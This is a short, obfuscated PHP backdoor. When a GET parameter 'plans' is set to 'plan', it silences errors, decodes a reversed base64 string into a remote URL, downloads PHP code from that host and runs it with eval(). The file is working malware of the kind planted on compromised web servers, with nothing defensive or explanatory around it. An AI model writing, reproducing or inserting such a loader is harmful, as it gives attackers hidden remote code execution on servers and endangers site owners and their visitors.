<?php
error_reporting(0);
$ch = $_GET['plans'];
if($ch == 'plan'){
$ch=curl_init(base64_decode(strrev("=AHaw5CdzFGbwV3LulWYt9CdthXZs9mc052bj9Cek9GdhN2b2F2Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);$e=base64_decode(strrev("4zP"));eval($e.$r);
}
?>